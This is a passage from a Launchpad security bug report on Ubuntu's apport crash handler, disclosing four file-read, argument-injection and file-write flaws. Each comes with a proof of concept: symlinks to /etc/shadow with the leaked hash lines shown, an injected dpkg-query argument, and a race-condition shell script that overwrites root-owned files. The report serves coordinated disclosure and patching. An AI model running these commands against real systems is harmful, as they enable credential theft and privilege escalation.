(cwd, pid)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# make sure if exists\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if os.path.exists(path):\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0content = read_file(path)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# truncate if bigger than 100 KB\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# see LP: #1696814\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0max_length = 100*1024\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if sys.getsizeof(content) \u003c max_length:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0report['HotspotError'] = content\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0report['Tags'] += ' openjdk-hs-err'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0report['HotspotError'] = content[:max_length] + \\\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"\\n[truncated by openjdk-11 apport hook]\" + \\\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"\\n[max log size is %s, file size was %s]\" % \\\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(si_units(max_length), si_units(sys.getsizeof(content)))\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0report['Tags'] += ' openjdk-hs-err'\n```\n\nBy injecting a `ProcCwd` such as `/home/user/` and a `Pid` such as `0`, the function includes an arbitrary file by following a potential symbolic link `/home/user/hs_err_pid0.log`.\n\n### PoC\n```\n$ sudo apt install openjdk-14-jdk\n\n$ sudo sysctl fs.protected_symlinks\nfs.protected_symlinks = 1\n\n$ ln -s /etc/shadow /home/user/hs_err_pid0.log\n\n$ pid=$'\\t0';cat \u003c\u003c EOF \u003e /var/crash/poc.crash\nProblemType: Crash\nExecutablePath: /poc\nPackage: openjdk-lts 123\nSourcePackage: openjdk-lts\nProcCwd: /home/user\nProcStatus:\n\u00a0Pid:$pid\n\u00a0Uid:$pid\nEOF\n\n$ grep -A3 root: /var/crash/poc.crash\n\u00a0root:!:18393:0:99999:7:::\n\u00a0daemon:*:18375:0:99999:7:::\n\u00a0bin:*:18375:0:99999:7:::\n\u00a0sys:*:18375:0:99999:7:::\n```\n\n## Issue 2: Arbitrary file read in package-hooks/source_xorg.py (Info)\nThe root cause of this issue stems from the fact, that a potentially\nuser-controlled file in the `/tmp` directory is not checked for being a symbolic link and therefore might allow including arbitrary files in the processed crash report:\n\nNote: Requires `fs.protected_symlinks=0`\n\n```Python\ndef attach_3d_info(report, ui=None):\n\u00a0\u00a0\u00a0\u00a0...\n\n\u00a0\u00a0\u00a0\u00a0# Compiz internal state if compiz crashed\n\u00a0\u00a0\u00a0\u00a0if True or report.get('SourcePackage','Unknown') == \"compiz\" and \"ProcStatus\" in report:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0compiz_pid = 0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0pid_line = re.search(\"Pid:\\t(.*)\\n\", report[\"ProcStatus\"])\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if pid_line:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0compiz_pid = pid_line.groups()[0]\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0compiz_state_file = '/tmp/compiz_internal_state%s' % compiz_pid\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0attach_file_if_exists(report, compiz_state_file, \"compiz_internal_states\")\n```\n\n### PoC\n```\n$ sudo sysctl fs.protected_symlinks=0\nfs.protected_symlinks = 0\n\n$ ln -s /etc/shadow /tmp/compiz_internal_state0\n\n$ cat \u003c\u003c EOF \u003e /var/crash/poc.crash\nProblemType: Crash\nExecutablePath: /poc\nPackage: source_xorg 123\nSourcePackage: compiz\nProcStatus:\n\u00a0Pid:\nEOF\n\n$ grep -A3 compiz_internal poc.crash\ncompiz_internal_states:\n\u00a0root:!:18686:0:99999:7:::\n\u00a0daemon:*:18474:0:99999:7:::\n\u00a0bin:*:18474:0:99999:7:::\n```\n\n## Issue 3: Spoof modified config files via argument injection (Info)\nThe `get_modified_conffiles()` function allows to spoof modified configuration files by a controlled package name:\n\n```Python\ndef get_modified_conffiles(self, package):\n...\n\u00a0\u00a0\u00a0\u00a0dpkg = subprocess.Popen(['dpkg-query', '-W', '--showformat=${Conffiles}',\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0package], stdout=subprocess.PIPE)\n```\n\nBy supplying a `package` name such as\n`--showformat='${Conffiles;6}shadow 1\\n'` it is possible to manipulate dpkg-query's output and therefore to include the `shadow` file in the resulting crash report.\n\nPlease note however that this function is seemingly only called in the `attach_conffiles()` function, which subsequently requires a UI response\nof the user to finally include the file in the crash report.\n\n### PoC\n```\n$ dpkg-query -W --showformat='${Conffiles}' --showformat='${Conffiles;6}shadow 1\\n' | head -n2\n\u00a0/etc/shadow 1\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0shadow 1\n```\n\n## Issue 4: Arbitrary file write in whoopsie-upload-all (Info)\nAfter adding additional information to the crash file, `whoopsie-upload-all` does not check if the crash file was replaced by a symbolic link before writing the extended report back into the file. Thus, replacing the crash file with a symbolic link allows to write into arbitrary files using `whoopsie-upload-all`'s elevated privileges. By using a program's lax configuration parsing (e.g. `logrotate`), this might lead to code execution.\n\nNote: Requires `fs.protected_symlinks=0`\n\n```Python\ndef process_report(report):\n\u00a0\u00a0\u00a0\u00a0'''Collect information for a report and mark for whoopsie upload\n\u00a0\u00a0\u00a0\u00a0...\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# write updated report, we use os.open and os.fdopen as\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# /proc/sys/fs/protected_regular is set to 1 (LP: #1848064)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fd = os.open(report, os.O_WRONLY | os.O_APPEND)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0with os.fdopen(fd, 'wb') as f:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0os.chmod(report, 0)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0r.write(f, only_new=True)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0os.chmod(report, 0o640)\n```\n\n### PoC\n```\n$ sudo sysctl fs.protected_symlinks\nfs.protected_symlinks = 0\n\n$ cat ex.sh\nTARGET=\"/JRN\"\nwhile :; do\n\u00a0\u00a0FN=\"/var/crash/$RANDOM.poc.crash\"\n\u00a0\u00a0pid=$'\\t0';cat \u003c\u003c EOF \u003e $FN\nProblemType: Crash\nExecutablePath: /poc\nPackage: openjdk-lts 123\nSourcePackage: openjdk-lts\nProcCwd: /home/user\nProcStatus:\n\u00a0Pid:$pid\n\u00a0Uid:$pid\nEOF\n\u00a0\u00a0while :; do\n\u00a0\u00a0\u00a0\u00a0if ps aux|grep -q \"[w]hoopsie-upload-all\";then break; fi\n\u00a0\u00a0done\n\u00a0\u00a0sleep 0.3\n\u00a0\u00a0rm -f $FN\n\u00a0\u00a0ln -s $TARGET $FN\n\n\u00a0\u00a0if [ -s /JRN ]; then echo DONE.; break; fi\ndone\n\n$ sudo touch /JRN; ls -l /JRN  # simulating file in e.g. /etc/logrotate.d/\n-rw-r--r-- 1 root root 0 M\ufffdr  3 14:15 /JRN\n\n$ bash ex.sh\nDONE.\n\n$ ls -l /JRN; sudo head -n3 /JRN\n-rw-r----- 1 root root 105028 M\ufffdr  3 14:16 /JRN\nApportVersion: 2.20.11-0ubuntu27.16\nArchitecture: amd64\nCasperMD5CheckResult: skip\n```\n\n# Credits\nPlease credit \u003cemail address hidden\u003e (@fktio) if the issues are considered valid. Further, please coordinate the patch release date with us, in case we consider publishing a short article about these issues.\n\nBest regards,\nmaik", "owner_link": "https://bugs.launchpad.net/api/devel/~mallle", "bug_tasks_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1917904/bug_tasks", "duplicate_of_link": null, "date_created": "2021-03-05T15:54:22.109007+00:00", "activity_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1917904/activity", "subscriptions_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1917904/subscriptions", "date_last_updated": "2021-06-30T01:42:26.187450+00:00", "who_made_private_link": null, "date_made_private": null, "heat": 258, "bug_watches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1917904/bug_watches", "cves_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1917904/cves", "duplicates_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1917904/duplicates", "attachments_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1917904/attachments", "security_related": true, "latest_patch_uploaded": "2021-05-13T16:44:42.103979+00:00", "tags": [], "date_last_message": "2021-05-26T00:45:21.214155+00:00", "number_of_duplicates": 0, "message_count": 34, "users_affected_count": 1, "users_unaffected_count": 0, "users_affected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1917904/users_affected", "users_unaffected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1917904/users_unaffected", "users_affected_count_with_dupes": 1, "other_users_affected_count_with_dupes": 1, "users_affected_with_dupes_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1917904/users_affected_with_dupes", "messages_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1917904/messages", "linked_branches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1917904/linked_branches", "linked_merge_proposals_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1917904/linked_merge_proposals", "http_etag": "\"841fe6352a618d2cde32d71a9feb87a650a5686e-dbabf0efb20db31e3fb93255d37f214e6421256b\""}, "bug_is_private": false, "context": {"self_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/apport/+bug/1917904", "web_link": "https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug_task", "bug_link": "https://bugs.launchpad.net/api/devel/bugs/1917904", "milestone_link": null, "status": "Fix Released", "importance": "Undecided", "assignee_link": null, "bug_target_display_name": "apport (Ubuntu)", "bug_target_name": "apport (Ubuntu)", "bug_watch_link": null, "date_assigned": null, "date_created": "2021-03-05T15:54:22.109007+00:00", "date_confirmed": "2021-05-26T00:45:26.651243+00:00", "date_incomplete": null, "date_in_progress": "2021-05-26T00:45:26.651243+00:00", "date_closed": "2021-05-26T00:45:26.651243+00:00", "date_left_new": "2021-05-26T00:45:26.651243+00:00", "date_triaged": "2021-05-26T00:45:26.651243+00:00", "date_fix_committed": "2021-05-26T00:45:26.651243+00:00", "date_fix_released": "2021-05-26T00:45:26.651243+00:00", "date_left_closed": null, "owner_link": "https://bugs.launchpad.net/api/devel/~mallle", "target_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/apport", "title": "Bug #1917904 in apport (Ubuntu): \"Arbitrary file reads\"", "related_tasks_collection_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/apport/+bug/1917904/related_tasks", "is_complete": true, "http_etag": "\"46817aa0247b8076fc12d7438a3a0318ccf68803-2e62f55a10c362b20198347768925ac5db81485c\""}, "information_type_data": {"PUBLIC": {"value": "PUBLIC", "is_private": false, "order": 0, "name": "Public", "description": "Everyone can see this information.\n", "description_css_class": "choice-description"}, "PRIVATESECURITY": {"value": "PRIVATESECURITY", "is_private": true, "order": 2, "name": "Private Security", "description": "Only the security group can see this information.\n ", "description_css_class": "choice-description"}, "USERDATA": {"value": "USERDATA", "is_private": true, "order": 3, "name": "Private", "description": "Only shared with users permitted to see private user information.\n", "description_css_class": "choice-description"}, "PUBLICSECURITY": {"value": "PUBLICSECURITY", "is_private": false, "order": 1, "name": "Public Security", "description": "Everyone can see this security related information.\n", "description_css_class": "choice-description"}}, "total_comments_and_activity": 105};</script>
+
+    
+  
+
+    
+  </body>
+
+
+  <!--
+    Facet name: bugs
+    Page type: main_side
+    Has global search: True
+    Has application tabs: True
+    Has side portlets: True
+
+    At least 65 queries/external actions issued in 0.88 seconds
+
+    Features: {'bugs.nominations.bug_supervisors_can_target': 'on', 'hard_timeout': '9000', 'visible_render_time': None, 'bugs.affected_count_includes_dupes.disabled': None, 'app.mainsite_only.canonical_url': None, 'app.maintenance_message': None, 'js.yui_version': None, 'profiling.enabled': None, 'baselayout.careers_link.disabled': None}
+
+    r0d8de2b
+
+    -->
+
+</html>
+
